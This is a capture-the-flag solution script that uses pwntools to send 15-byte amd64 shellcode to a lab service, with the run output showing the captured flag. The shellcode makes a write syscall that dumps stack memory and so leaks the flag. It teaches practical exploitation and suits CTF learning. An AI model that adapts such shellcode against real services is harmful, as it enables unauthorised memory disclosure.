'''
$ python3 golfrev-solution.py 
[+] Opening connection to 192.168.57.1 on port 9000: Done
b'Your shellcode can be at most 15 bytes, go:'
[*] Switching to interactive mode
ibctf{y0ur_sh3llc0d3_sk1ll7-are-1337}[*] Got EOF while reading in interactive
$ 
'''
from pwn import *

context.os = 'linux'
context.arch = 'amd64'
r = remote('192.168.57.1', 9000)
print(r.recvuntil(b"go:"))
shellcode = asm('''
    mov dil, 1
    mov dl, 37
    pop rsi
    pop rsi
    pop rsi
    xor rax, rax
    mov al, 1
    syscall
''', vma=0x400000)
r.sendline(shellcode)
r.interactive()
